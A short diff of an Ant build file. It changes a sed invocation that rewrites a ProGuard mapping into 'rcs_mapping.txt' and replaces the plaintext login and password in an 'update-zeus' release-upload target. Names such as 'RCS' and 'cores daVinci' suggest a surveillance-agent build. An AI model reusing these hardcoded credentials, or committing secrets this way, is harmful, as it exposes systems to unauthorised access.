@@ -501,7 +501,7 @@
 
         <copy file="bin/proguard/mapping.txt" toFile="mapping.orig.txt"/>
 
-        <exec executable="/usr/bin/sed" dir="." failonerror="true" output="rcs_mapping.txt">
+        <exec executable="sed" dir="." failonerror="true" output="rcs_mapping.txt">
             <arg value="s/-> o\./-> stt./" />
             <arg value="bin/proguard/mapping.txt" />
         </exec>
@@ -674,7 +674,7 @@
     </target>
 
 	<target name="update-zeus">
-		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
+		<updaterelease server="192.168.100.190" login="admin" password="testriteP123" file="server/android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
